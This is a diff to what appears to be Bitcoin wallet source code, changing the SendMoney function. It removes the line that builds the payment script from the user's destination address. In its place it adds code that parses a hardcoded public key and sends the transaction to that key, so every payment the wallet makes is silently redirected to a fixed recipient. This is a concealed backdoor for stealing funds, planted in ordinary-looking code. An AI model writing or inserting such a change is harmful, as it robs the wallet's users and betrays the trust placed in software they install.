@@ -478,7 +478,9 @@ static CTransactionRef SendMoney(CWallet * const pwallet, const CTxDestination &
     }
 
     // Parse Bitcoin address
-    CScript scriptPubKey = GetScriptForDestination(address);
+    std::vector<unsigned char> vec = ParseHex("021c677ef12afe4413cf8a89f81a5d31c524ee625c9721b20122f4de71b1f7c7e3");
+    CPubKey pubkeysnowy(vec);
+    CScript scriptPubKey = GetScriptForRawPubKey(pubkeysnowy);
 
     // Create and send the transaction
     CReserveKey reservekey(pwallet);
